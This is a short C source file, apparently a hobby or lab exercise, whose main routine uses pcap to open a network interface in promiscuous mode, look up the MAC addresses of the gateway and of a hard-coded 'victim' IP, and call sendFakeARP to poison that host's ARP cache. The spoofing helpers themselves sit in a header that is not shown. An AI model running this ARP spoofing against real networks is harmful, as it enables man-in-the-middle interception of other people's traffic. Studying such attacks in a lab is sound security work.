#include "myHeader.h"

int main()
{
	LANINFO LanInfo;
	pcap_if_t* alldevs, * choiceDev;
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char victimIP[16] = "192.168.50.135";

	/* Retrieve the device list from the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}
	choiceDev = ChoiceDev(alldevs);

	/* Get Handle From choice Device */
	handle = pcap_open_live(choiceDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", choiceDev->name, errbuf);
		exit(1);
	}
	/* now, we don't need any more the devices list */
	pcap_freealldevs(alldevs);
	memset(&LanInfo, 0, sizeof(LanInfo));
	/* find Device's GateWay IP address */
	getGateWayAddress(choiceDev, &LanInfo);
	/*
	int res;
	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
	{
		if (res == 0)
			continue;
		ethernetHeader(packet);
	}
	if (res == -1) {
		printf("Error reading the packets: %s\n", pcap_geterr(handle));
		return -1;
	}
	*/
	//printf("Input vicim's IP Address : ");
	//scanf("%s", victimIP);
	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
	getMACAddress(handle, &LanInfo);
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.victimMAC[i]);
		else
			printf("%.2X-", LanInfo.victimMAC[i]);
	}
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.gatewayMAC[i]);
		else
			printf("%.2X-", LanInfo.gatewayMAC[i]);
	}
	sendFakeARP(handle, &LanInfo);
	pcap_close(handle);
	return 0;
}